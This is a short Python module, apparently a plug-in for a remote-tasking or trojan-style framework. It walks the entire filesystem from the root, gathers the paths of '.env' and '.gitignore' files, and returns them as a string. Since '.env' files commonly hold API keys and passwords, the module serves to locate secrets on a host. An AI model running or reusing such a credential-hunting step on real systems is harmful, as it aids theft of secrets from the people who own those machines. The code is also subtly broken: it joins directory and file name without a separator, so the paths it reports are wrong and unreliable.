import os

def run(**args):
    files = list()
    print('[+] In walker.py')
    
    for root, _, fname in os.walk('/'):
        if '.' not in root:
            for file in fname:
                if file.startswith('.env') or file == ".gitignore":
                    files.append(root + file)

    return str(files)